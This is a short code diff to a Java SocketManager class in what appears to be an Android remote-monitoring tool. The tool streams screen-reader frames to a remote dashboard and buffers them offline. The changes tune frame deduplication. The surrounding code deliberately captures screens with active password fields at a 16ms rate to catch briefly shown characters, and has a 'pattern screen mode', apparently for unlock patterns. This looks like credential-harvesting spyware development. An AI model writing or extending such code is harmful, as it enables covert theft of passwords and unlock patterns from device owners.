@@ -1840,6 +1840,10 @@ public class SocketManager {
                 heartbeatExecutor.execute(() -> {
                     screenReaderDashboardIntervalMs = requestedIntervalMs;
                     lastScreenReaderDashboardPushMs = 0L; // allow first frame immediately
+                    // Reset dedup state so the very next tick sends a frame regardless of
+                    // whether the screen has changed since the last push.
+                    lastFrameFingerprint     = null;
+                    consecutiveDuplicateCount = 0;
                     manualRecordingActive = true;
                     ScheduledFuture<?> srf = screenReaderFuture;
                     if (srf == null || srf.isDone() || srf.isCancelled()) {
@@ -2091,9 +2095,14 @@ public class SocketManager {
                 // up and fade within ~20-30ms and must all be captured at the 16ms fast rate.
                 boolean hasPasswordInput = screenHasActivePasswordField(screenResult);
                 String fp = computeFrameFingerprint(screenResult);
-                if (!hasPasswordInput && !inPatternScreenMode && !fp.isEmpty() && fp.equals(lastFrameFingerprint)) {
+                boolean isDuplicate = !hasPasswordInput && !inPatternScreenMode && !fp.isEmpty() && fp.equals(lastFrameFingerprint);
+                if (isDuplicate) {
                     consecutiveDuplicateCount++;
-                    if (consecutiveDuplicateCount > 1) {
+                    // Only skip the entire tick when NOT live-streaming to dashboard.
+                    // When manualRecordingActive is true, let the throttle handle rate-limiting
+                    // so the dashboard always receives frames at the configured interval even
+                    // when the screen content is unchanged (static screen).
+                    if (consecutiveDuplicateCount > 1 && !manualRecordingActive) {
                         Log.d(TAG, "screen_reader: static screen, skip #" + consecutiveDuplicateCount);
                         return;
                     }
@@ -2108,7 +2117,8 @@ public class SocketManager {
                 if (screenResult.has("screen")) payload.put("screen", screenResult.get("screen"));
                 if (screenResult.has("error"))  payload.put("error",  screenResult.getString("error"));
 
-                if (autoRecordingActive || manualRecordingActive) {
+                // Only add non-duplicate frames to the offline buffer to avoid storing identical data.
+                if (!isDuplicate && (autoRecordingActive || manualRecordingActive)) {
                     synchronized (offlineFrameBuffer) {
                         offlineFrameBuffer.add(payload);
                     }
